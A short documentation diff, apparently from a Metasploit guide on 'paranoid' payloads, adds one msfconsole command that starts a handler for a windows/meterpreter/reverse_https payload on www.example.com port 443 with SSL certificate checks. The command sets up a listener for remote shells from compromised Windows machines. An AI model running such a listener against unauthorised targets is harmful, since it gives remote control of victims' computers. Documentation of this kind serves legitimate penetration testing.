@@ -35,3 +35,7 @@ Saved as: launch-paranoid-stageless.exe
 ```
 
 ### Create a Paranoid Listener
+
+```
+$ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
+```
